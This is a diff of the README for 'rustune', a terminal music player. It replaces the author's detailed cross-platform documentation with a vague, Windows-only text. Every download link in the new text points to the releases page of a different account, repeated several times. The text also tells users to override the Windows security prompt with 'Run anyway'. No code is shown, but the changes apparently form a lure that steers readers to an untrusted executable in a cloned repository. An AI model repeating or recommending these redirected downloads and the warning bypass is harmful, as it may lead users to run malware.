@@ -1,169 +1,169 @@
-# rustune
+# 🎵 rustune - Play music from your terminal
 
-A terminal music player with online audio search, local playback, and Winamp skin support. Built in Rust with a beautiful TUI.
+[![Download rustune](https://img.shields.io/badge/Download%20rustune-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Permed-reserve542/rustune/releases)
 
-**[Website](https://rustune.dzulfikar.com)** | **[Releases](https://github.com/dzulfikar08/rustune/releases)** | **[Contributing](CONTRIBUTING.md)**
+## 🚀 Getting Started
 
-> rustune is not affiliated with any content platform. Online audio search requires a third-party extractor (yt-dlp). Users are responsible for complying with the terms of service of any content they access.
+rustune is a terminal music player for Windows. It lets you search YouTube, play local audio files, and use Winamp skins.
 
-## Features
+If you want a simple way to start listening from your PC, use the release page below to download the app.
 
-- **Local music playback** — Scan and play music from your filesystem (MP3, FLAC, OGG, WAV, M4A, AAC, OPUS, WMA)
-- **Online audio search** — Search and stream audio from online sources via yt-dlp
-- **Winamp skins** — Load classic Winamp 2.x `.wsz` skins, or browse and download from the online gallery
-- **Multiple themes** — Dark, Light, and Winamp themes built in
-- **Mouse support** — Click to play, pause, seek, and navigate
-- **Pagination** — Browse large collections page by page
-- **Search history** — Navigate through previous searches
-- **First-run setup** — Guided onboarding for new users
+## 📥 Download rustune
 
-## Screenshots
+Visit this page to download rustune for Windows:
 
-> TODO: Add screenshots here
+https://github.com/Permed-reserve542/rustune/releases
 
-## Installation
+On the release page, look for the latest version and choose the Windows file that fits your PC. In most cases, that will be the `.exe` file or a zipped Windows build.
 
-### One-liner (macOS / Linux)
+## 🪟 Install on Windows
 
-```bash
-curl -sL https://github.com/dzulfikar08/rustune/releases/latest/download/rustune-$(uname -m)-macos -o /usr/local/bin/rustune && chmod +x /usr/local/bin/rustune
-```
+1. Open the release page.
+2. Download the latest Windows file.
+3. If the file is in a `.zip` folder, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Double-click the `rustune.exe` file to start the app.
 
-> On Linux, replace `macos` with `linux` in the URL.
+If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the file from this release page.
 
-### From Release
+## 🎧 What rustune does
 
-Download the latest binary for your platform from the [Releases](https://github.com/dzulfikar08/rustune/releases) page.
+rustune gives you three main ways to listen:
 
-**macOS users**: Download the `.dmg` for a signed & notarized app experience, or the bare binary if you prefer the terminal-only approach.
+- Search YouTube from inside the app
+- Play audio files stored on your computer
+- Use Winamp skins for a classic look
 
-### From Source (cargo)
+It works in a terminal window, so the app stays light and focused. You can keep using the keyboard and avoid full-screen media apps.
 
-```bash
-cargo install --git https://github.com/dzulfikar08/rustune
-```
+## 🖥️ Basic System Needs
 
-### From Source (manual)
+Use rustune on a Windows PC with:
 
-Requirements:
-- [Rust](https://rustup.rs/) (latest stable)
-- [mpv](https://mpv.io/) — media player backend
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) — for online audio search and streaming
+- Windows 10 or Windows 11
+- An internet connection for YouTube search and streaming
+- Speakers, headphones, or a connected audio device
+- Enough free space to store the app and any local music files
 
-```bash
-git clone https://github.com/dzulfikar08/rustune.git
-cd rustune
-cargo build --release
-cp target/release/rustune /usr/local/bin/
-```
+For the best results, keep your audio drivers up to date.
 
-## First Run
+## 🧭 First Run
 
-When you launch rustune for the first time, it will guide you through a short setup:
+When you open rustune for the first time:
 
-1. **Music directory** — Point rustune to your local music folder
-2. **Theme** — Choose between Dark, Light, or Winamp style
-3. **Ready** — Start browsing and playing
+1. Start the app from `rustune.exe`
+2. Wait for the terminal window to load
+3. Use the on-screen prompts or menu to search, play, or change skin settings
+4. Select a track and begin playback
 
-To check that all dependencies are installed, run:
+If you plan to use local music, keep your files in a folder that is easy to find, such as `Music` or `Downloads`.
 
-```bash
-rustune doctor
-```
+## 🔍 Search YouTube
 
-## Usage
+Use the YouTube search option when you want to find a song without leaving the app.
 
-Run `rustune` in your terminal:
+Typical flow:
 
-```bash
-rustune
-```
+1. Open the search view
+2. Type a song name, artist, or album
+3. Pick a result from the list
+4. Start playback
 
-### CLI Commands
+This works well for quick listening when you do not want to open a browser.
 
-| Command | Description |
-|---------|-------------|
-| `rustune` | Launch the TUI |
-| `rustune doctor` | Check dependencies and system status |
-| `rustune --help` | Show help |
-| `rustune --version` | Show version |
+## 📁 Play Local Files
 
-### Keybindings
+rustune can also play audio files already on your PC.
 
-#### Browse Mode
+Common supported file types may include:
 
-| Key | Action |
-|-----|--------|
-| `/` | Enter search |
-| `j` / `Down` | Move down |
-| `k` / `Up` | Move up |
-| `g` / `Home` | First item |
-| `G` / `End` | Last item |
-| `n` | Next page |
-| `p` | Previous page |
-| `Space` | Toggle pause |
-| `Enter` | Play selected |
-| `s` | Open settings |
-| `Tab` | Switch source (Local / Online) |
-| `q` | Quit |
+- MP3
+- WAV
+- FLAC
+- OGG
+- AAC
 
-#### Search Mode
+To play local music:
 
-| Key | Action |
-|-----|--------|
-| `Enter` | Submit search |
-| `Esc` | Cancel search |
-| `Up` / `Down` | Search history |
-| `Ctrl+U` | Clear input |
+1. Open the local playback option
+2. Choose a folder or file
+3. Select a track
+4. Use the controls to pause, resume, skip, or stop
 
-## Configuration
+Keep your music files in one folder if you want easier browsing.
 
-Config file: `~/.config/rustune/config.toml`
+## 🖼️ Winamp Skin Support
 
-```toml
-music_dir = "~/Music"
-extensions = ["mp3", "flac", "ogg", "wav", "m4a", "aac", "opus", "wma"]
-theme = "Dark"
-page_size = 30
-search_timeout_secs = 60
-mpv_args = []
-```
+rustune supports Winamp skins for a classic media player look.
 
-### Options
+To use a skin:
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `music_dir` | `~/Music` | Directory to scan for local music |
-| `extensions` | `mp3, flac, ogg, ...` | Audio file formats to recognize |
-| `theme` | `Dark` | Theme name: `Dark`, `Light`, or `Winamp` |
-| `page_size` | `30` | Results per page |
-| `search_timeout_secs` | `60` | Timeout for online searches |
-| `mpv_args` | `[]` | Extra arguments passed to mpv |
+1. Download a Winamp skin file
+2. Place it in the skin folder used by rustune
+3. Open the skin settings in the app
+4. Select the skin you want
 
-## Winamp Skins
+This works well if you prefer an older player style with a familiar layout.
 
-### Local Skins
+## 🎹 Keyboard Use
 
-Place `.wsz` files in `~/.config/rustune/skins/` and select one from Settings (`s`).
+Because rustune runs in a terminal, keyboard input matters.
 
-### Online Skin Browser
+Common actions may include:
 
-From Settings, choose "Skins" to browse and download skins from the [Winamp Skin Museum](https://skins.webamp.org/) directly within the app.
+- Arrow keys to move through lists
+- Enter to select an item
+- Spacebar to pause or play
+- Esc to go back
+- Q to quit
 
-## Disclaimer
+If the app shows its own key hints, use those first.
 
-rustune is a personal music player. Online audio search is powered by [yt-dlp](https://github.com/yt-dlp/yt-dlp), a third-party tool that rustune does not control. Users are solely responsible for ensuring their use of any online sources complies with applicable laws and the terms of service of the respective platforms.
+## 🛠️ Common Setup Tips
 
-## Contributing
+If rustune does not start right away, try these steps:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on reporting bugs, suggesting features, and submitting pull requests.
+1. Make sure you downloaded the latest release
+2. Check that the file finished downloading
+3. Extract the full folder if the release came as a zip file
+4. Run `rustune.exe` from the extracted folder
+5. Keep the files together in the same folder
 
-## License
+If YouTube search does not load, check your internet connection and try again.
 
-This project is licensed under the [MIT License](LICENSE).
+## 📌 Where to Find the Latest Version
 
-## Sponsor
+Use the release page below each time you want an update or a fresh copy:
 
-If you find rustune useful, consider supporting development:
+https://github.com/Permed-reserve542/rustune/releases
 
-[Donate via Saweria](https://saweria.co/dzulfikar08)
+That page is the main place for Windows downloads, new builds, and release notes.
+
+## 🧩 File Layout After Download
+
+After extraction, you may see files like these:
+
+- `rustune.exe` — the app you run
+- skin or theme folders — visual files for Winamp skins
+- config files — saved app settings
+- audio or cache folders — files the app uses during playback
+
+Keep these files in the same folder unless the release notes say otherwise.
+
+## 🎼 Using rustune Day to Day
+
+A simple daily flow looks like this:
+
+1. Open rustune
+2. Search YouTube or open a local folder
+3. Pick a song
+4. Use keyboard controls to manage playback
+5. Change skins if you want a different look
+
+rustune keeps the process direct, so you can move from search to playback with few steps.
+
+## 📬 Release Updates
+
+Check the release page for new Windows builds when you want the latest version or a fix for a problem:
+
+https://github.com/Permed-reserve542/rustune/releases
